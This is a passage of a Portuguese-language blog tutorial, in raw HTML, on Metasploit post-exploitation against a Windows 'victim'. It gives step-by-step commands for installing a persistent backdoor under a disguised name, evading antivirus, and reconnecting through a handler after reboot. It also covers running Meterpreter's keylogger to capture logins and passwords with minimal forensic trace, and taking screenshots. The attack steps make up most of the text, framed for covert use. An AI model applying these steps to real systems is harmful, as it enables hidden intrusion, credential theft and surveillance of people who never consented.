dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">i - para ele tentar conectar a cada 20 segundos</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">p - porta 80 pois não parece suspeito </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">r - o IP do atacante</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O problema desse método é que ele é detectado pelo Antivírus, então para conseguir ultrapassar o antivírus podemos utilizar uma combinação de vários métodos.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 16pt; margin-top: 0pt;"><span style="color: #666666; font-family: &quot;arial&quot;; font-size: 15pt; vertical-align: baseline; white-space: pre-wrap;">Ultrapassando o Antivírus</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Primeiro precisamos sair da seção atual desse backdoor com o comando</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&gt; background</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vamos utilizar um módulo do metasploit</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Este módulo irá instalar um Payload que será executado durante a inicialização. Ele será executado no logon do usuário ou na inicialização do sistema através do valor do registro em "CurrentVersion\Run" (dependendo do privilégio e do método selecionado).</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; use exploit/windows/local/persistence</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"><img height="63" src="https://lh6.googleusercontent.com/ZH5wpJkoYaMm5m_J9u064cYEhlOnt7olOt5w-wThuIFr9AchJoQbWJl-3Cbxp-w3VfkW8fyw1j-rBr5zM59BvXNtJ7_W3rt8SPh-TuBZwcpcoQn9hoIlEk9ekkZ4U6KpXurWcGEm" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; show options</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vemos que tem algumas opções para configurar o Payload. </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="336" src="https://lh4.googleusercontent.com/m5ELkHIePC0T-KqbL54HOjfk39xuGJiuyeepKXy3pndICt4nO_CeNUJm-w0uOX9Ldpdi9XZeQmP_gN-OHTtudkInHCkV6QpRti5JCDxra7UczpCe00LDh3757Q9TidR3PE5OOBnp" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">EXE_NAME</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> - podemos mudar o nome do Payload para ficar menos detectável. Utilizaremos browser.exe.</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">SESSION</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> - em qual seção do meterpreter usaremos esse Payload, podemos ver quando fizemos o background na imagem acima que aquela era a session 1. Fazenso o comando &gt; sessions -l podemos ver todas as sessões ativas.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">para ver como está as novas configurações fazemos o comando</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; show options </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"><img height="124" src="https://lh6.googleusercontent.com/RPv9rm3kf9eF-RvgU-gKde_zzZHLwZoe8AwqUn6YhwW1Z5Mrp9rYHtmP_IRhKFw275HtXG2CrbcA6bjl5owJrdkt3Ffmj-LzVmWYRH38Vs2vMKCs8-7X9nO183SO1zlLKYnrQP87" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Agora o mais importante é especificar o Payload que será injetado como um serviço.</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Todo módulo tem configurações avançadas, para acessá-las devemos fazer o comando:</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; show advanced </span><br /><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"><br /></span><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"><img height="260" src="https://lh5.googleusercontent.com/7JLFAYPJ9by_I4rz9zMTFhxsF9Tq4a2zBlXAgBQc2KUvRaFdZw3ufIUt2onobad7D2zD-XKkWbY3JXvTMu2JzO_4V6_97wrpdBK2-oHYmtKdZJGFKF79eY-oyiQrWoxK6UHSunpZ" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">A que estamos mais interessado é EXE: :Custom - </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&gt; set EXE: :Custom /var/www/htmal/backdoor.exe</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">é o payload que estamos usando, vamos verificar se foi atualizado</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; show advanced </span><br /><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="269" src="https://lh5.googleusercontent.com/mO3F2H5lLnEoVqxW1jmEWCxnJJen6s3-nFwUXRZpN911YJ9oTlsWyycfv06dV8RrGc-wkOaWJqQbastcIGqaheV_fg-3yjWEfKZ5EwEh8HuR62wqpWKWZZVJw10U7aSXewO0g6wG" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; Exploit </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">para iniciar o backdoor</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="101" src="https://lh4.googleusercontent.com/1_gJNX2_kC13BozMzJow3SIUBF9oeyIWtZDuMl74ThCtr5csU_RwSAdu15KR6ocRNcOpVyMbCy1c0P4feiRp45DYKwFk_fj4_KeHrHVpT9i1QQa3p8dm_9COyEqY1RVnBowmuuY7" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Esse RC File marcado na foto acima é para retirar esse backdoor da máquina da vítima, por isso é bom guardar esse caminho para quando futuramente quiser deletar. para isso, no meterpreter faça o comando </span><span style="background-color: white; color: #29303b; font-family: &quot;arial&quot;; font-size: 10pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;">resource /path/to/rc/file.rc</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">vamos ver as sessões ativas, finalizar elas e verificar se foi finalizadas</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; sessions -l</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; sessions -k</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; sessions -l</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="176" src="https://lh5.googleusercontent.com/9mIG2tEimqOiPBZmtFZt89ZlxuOm6rkXIeDIwXhdiDZ_PmnVoYHaQ5DthRb64bAg8Jz8DUWcTR08kuiwCj7e-yZhweo3MYkxW9Y6vF5aRzng4FPB1xgjnnemDdiUEvm_jFjtBtxO" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Agora fazemos um restart no computador da vitima</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="382" src="https://lh3.googleusercontent.com/YelCvqzkvD8OjhlPMz9jfSPJs6ZKbEuuoVTyYL6W5hVaJCESKCWc0F1672tWmug1i63zxvwcJZEg4AdImpXXndlMUH7CPvTWXLBd3eZfU4EKYT5Jw323op7YTGjOaS85mrasqcne" style="border: none; transform: rotate(0rad);" width="506" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">E ele vai a cada 10 segundos tentar conectar a vítima. para isso só precisamos rodar o meterpreter handler para acessá-lo. </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; use exploit/multi/handler</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; show options</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; exploit</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="351" src="https://lh6.googleusercontent.com/Q6SGxlnCObFZ3scnxY5uQsl-Xuj6jbEYm6P8UZnzPWkc2HNw98dbE5mihe2N5lYzmihn37WYqstOGRWH1hQ9a18b2T0DxklSUgABv6_bOwQldsoDzeA590nmPHvATl3ZVCFKyo_c" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Temos novamente contato com a vítima, mesmo após ela iniciar pois a cada dez segundos ela tenta contato conosco.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Se mesmo assim for detectado pelo antivírus, tente modificar alguns detalhes como set DELAY, VBS_NAME ou REG_NAME.</span></div><br /><h1 dir="ltr" style="line-height: 1.68; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 20pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Comandos da interface de usuário</span></h1><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">enumdesktops</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - lists all accessible desktops</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">getdesktop</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - get the current meterpreter desktop</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">idletime</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - checks to see how long since the victim system has been idle</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">keyscan_dump</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - dumps the contents of the software keylogger</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">keyscan_start</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - starts the software keylogger when associated with a process such as Word or browser</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">keyscan_stop</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - stops the software keylogger</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">screenshot</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - grabs a screenshot of the meterpreter desktop</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">set_desktop</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - changes the meterpreter desktop</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">uictl</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - enables control of some of the user interface components</span></div></li></ul><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 16pt; margin-top: 0pt;"><span style="color: #666666; font-family: &quot;arial&quot;; font-size: 15pt; vertical-align: baseline; white-space: pre-wrap;">Capturando Dados do Teclado </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Depois de ter explorado um sistema, existem duas abordagens diferentes que você pode tomar, ir com tudo e pegar muitas informações ou com calma e lento. </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Com calma e lento pode levar a uma tonelada de ótimas informações, se você tiver paciência e disciplina.</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Uma ferramenta que você pode usar para obter uma coleta de informação baixa e lenta é o script do registrador de teclas com o Meterpreter. Esta ferramenta é muito bem projetada, permitindo que você capture todas as entradas de teclado do sistema, sem escrever nada no disco, deixando uma pegada forense mínima para os pesquisadores seguir mais tarde. </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Perfeito para obter senhas, contas de usuários e todo tipo de outras informações valiosas.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vamos ver isso em ação. Primeiro, exploit um sistema como fazemos normalmente.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para isso vamos utilizar um módulo chamado </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&gt; keyscan_start</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="161" src="https://lh5.googleusercontent.com/1NbA0fcxlcvdxZu6DX8sqtjYwA0j8-Ymm_3vLmX_JOR0wBGqtKOnep2CMJ9g9NM45R9-1Uk1QJNlPQPOp_neDHQi5axTo_okoTe-6F5Z-l3gz9Z1Pys6E8xPBb-cFsq7XOEyNw9O" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Quando a vítima fizer qualquer login, seja de administrador, ou até facebook em https esse módulo te diz o login e senha</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; keyscan_dump</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="83" src="https://lh5.googleusercontent.com/oks1L1ps9wV_B9VInv4UCQ4fUn3ZRGseXqCBC8ko3F7UgGZwc5_R-Bk6T0AdRwRIL3u8jLXqCr8H5ECgxMbYaybF_qxoul_zrycyQkvbg4k4cgD9x2RvnYcRnPCtwJftiXw6USCm" style="border: none; transform: rotate(0rad);" width="319" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Nós capturamos o administrador iniciando sessão com uma senha de 'ohnoes1vebeenh4x0red!'.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para parar só precisamos fazer o comando </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; keyscan_stop</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 16pt; margin-top: 0pt;"><span style="color: #666666; font-family: &quot;arial&quot;; font-size: 15pt; vertical-align: baseline; white-space: pre-wrap;">Tirando screenshot</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&gt; screenshot</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="97" src="https://lh6.googleusercontent.com/78ZvpcGAtQAWIVeQDBByf6dycUaOI1aDQBFS3yKj1l52fMVxr4Q-m1FI5Ca2XAbDw4nUFOAUOd-vVg4yCqIsi_CA3XfGjyyvx4ZbSfGlUvJALRdEMWLNOW0HOrIc6g7pFwdFC47r" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Todas as fotos estarão no diretório demonstrado.</span></div><br />